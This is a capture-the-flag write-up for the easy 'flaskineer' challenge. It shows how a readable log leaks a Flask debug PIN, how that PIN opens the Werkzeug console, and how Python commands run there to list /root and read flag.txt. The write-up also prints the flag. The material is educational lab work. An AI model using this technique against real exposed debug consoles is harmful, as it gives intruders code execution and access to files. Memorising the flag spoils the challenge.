# flaskineer

[library.m0unt41n.ch/challenges/flaskineer](https://library.m0unt41n.ch/challenges/flaskineer) ![](../../resources/misc.svg) ![](../../resources/easy.svg) 

# TL;DR

We get a webapp URL and SSH login. The webapp gets us a simple `Hello, AI!` greeting.

# Initial look

Let's login with SSH and look around:

```
$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4364  3004 ?        Ss   06:26   0:00 /bin/bash ./start.sh
root           7  0.0  0.1 182948 30100 ?        S    06:26   0:00 /usr/bin/python3 /opt/flaskineer/app.py
root           8  0.0  0.0  15432  9168 ?        S    06:26   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root           9  0.0  0.0  15924  9656 ?        Ss   06:26   0:00 sshd: lettuce [priv]
lettuce       20  0.0  0.0  16184  7176 ?        R    06:26   0:00 sshd: lettuce@pts/0
lettuce       21  0.0  0.0   2892  1000 pts/0    Ss   06:26   0:00 -sh
lettuce       60  0.0  0.0   7484  3240 pts/0    R+   06:35   0:00 ps auxww
```

At this point I tried poking in `/proc/*/environ`, but that was locked.

# The app

But the actual app code is readable:

`/opt/flaskineer/start.sh`
```bash
#!/bin/bash
/usr/bin/python3 /opt/flaskineer/app.py &
/usr/sbin/sshd -D
```

`/opt/flaskineer/app.py`
```python
from flask import Flask, request
import logging
from werkzeug.debug import DebuggedApplication

app = Flask(__name__)
logging.basicConfig(filename='/var/log/flaskineer.log', level=logging.DEBUG)

@app.route('/')
def main():
    app.logger.info('Hello, AI request received!')
    return 'Hello, AI!'

@app.route('/reproduce')
def reproduce():
    dna_data = int(request.args.get("data"))
    app.logger.info(f"Trying to reproduce using: {dna_data}")
    return 'Reproducing in progress...'

if __name__ == "__main__":
    app.debug = True
    if app.debug:
        debugger = DebuggedApplication(app, evalex=True)
        pin = debugger.pin
        app.logger.debug(f"Flask Debugging PIN: {pin}")
        print(f"Flask Debugging PIN: {pin}")

    app.run(host='0.0.0.0', port=5000, use_reloader=False) 
```

So it's Flask running **with enabled debug console**. And there is a log, which is accessible too:

`/var/log/flaskineer.log`
```
DEBUG:app:Flask Debugging PIN: 408-687-756
INFO:werkzeug:WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://10.42.0.199:5000
INFO:werkzeug:Press CTRL+C to quit
INFO:app:Hello, AI request received!
INFO:werkzeug:10.42.0.45 - - [26/Aug/2024 06:27:03] "GET / HTTP/1.1" 200 -
INFO:werkzeug:10.42.0.45 - - [26/Aug/2024 06:27:03] "GET /favicon.ico HTTP/1.1" 404 -
```

And indeed, going to
[https://xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.library.m0unt41n.ch:1337/console](https://xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.library.m0unt41n.ch:1337/console)
with that PIN gets us Flask debug console. From here it's easy.

# Getting the flag

Is it in the environ? Nope:

```python
>>> print(os.environ)
environ({'KUBERNETES_SERVICE_PORT_HTTPS': '443', 'CHALLENGE_NAMESPACE': 'challenge-daf98fa3-34a9-4e5e-81f7-78bdd19dc6fe', 'KUBERNETES_SERVICE_PORT': '443', 'HOSTNAME': 'flaskineer', 'PWD': '/opt/flaskineer', 'HOME': '/root', 'KUBERNETES_PORT_443_TCP': 'tcp://10.43.0.1:443', 'SHLVL': '0', 'KUBERNETES_PORT_443_TCP_PROTO': 'tcp', 'KUBERNETES_PORT_443_TCP_ADDR': '10.43.0.1', 'KUBERNETES_SERVICE_HOST': '10.43.0.1', 'KUBERNETES_PORT': 'tcp://10.43.0.1:443', 'KUBERNETES_PORT_443_TCP_PORT': '443', 'PATH': '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', '_': '/usr/bin/python3', 'LC_CTYPE': 'C.UTF-8', 'WERKZEUG_SERVER_FD': '4'})
```

Is it in the root directory? Yes:

```python
>>> os.listdir("/root")
['.profile', '.bashrc', 'flag.txt', '.cache']

>>> with open("/root/flag.txt", "r") as f:
...   print(f.read())
cyberskills23{quack_quack_im_a_debug_duck}
```

---

## `cyberskills23{quack_quack_im_a_debug_duck}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
